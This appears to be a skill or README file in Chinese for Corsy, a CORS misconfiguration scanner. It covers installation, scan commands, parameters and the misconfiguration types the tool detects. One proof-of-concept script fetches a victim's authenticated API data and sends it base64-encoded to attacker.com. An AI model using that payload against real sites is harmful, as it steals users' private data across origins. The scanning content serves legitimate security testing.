---
name: "corsy"
description: ">"
---

# Corsy

*Sourced from killvxk-malskills-zh*

# Corsy

CORS 错误配置扫描器——检测可利用的跨域策略缺陷。

## 快速开始

```bash
pip install corsy

# Single URL
corsy -u https://target.com

# With authentication
corsy -u https://target.com -H "Authorization: Bearer TOKEN"

# Bulk scan from file
corsy -i urls.txt

# Output to JSON
corsy -u https://target.com --json > cors.json
```

## 核心参数

| 参数 | 用途 |
|------|---------|
| `-u URL` | 目标 URL |
| `-i FILE` | 包含 URL 的输入文件 |
| `-H "K:V"` | 自定义请求头 |
| `-t N` | 线程数 |
| `-d N` | 请求间延迟（毫秒） |
| `-q` | 静默模式（不显示横幅） |
| `--json` | JSON 格式输出 |

## 检测的 CORS 错误配置类型

| 类型 | 触发条件 |
|------|-----------|
| 反射 Origin（Reflected Origin） | 任意 Origin 被原样反射 |
| 信任 Null（Trusted Null） | `null` Origin 被信任 |
| 前缀匹配（Prefix Match） | 当 `target.com` 被信任时 `eviltarget.com` 也被接受 |
| 后缀匹配（Suffix Match） | `notatarget.com` 被接受 |
| 信任子域（Trusted Subdomain） | 所有子域均被信任 |
| 允许 HTTP（HTTP allowed） | HTTPS 端点信任 HTTP 来源 |

## 常见工作流程

**扫描需认证的端点：**
```bash
corsy -u https://api.target.com/user/profile -H "Cookie: session=abc123"
```

**使用 PoC 验证：**
```html
<script>
fetch('https://api.target.com/user/data', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://attacker.com?d='+btoa(d)))
</script>
```

## 参考资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | CORS 利用 PoC 模板 |

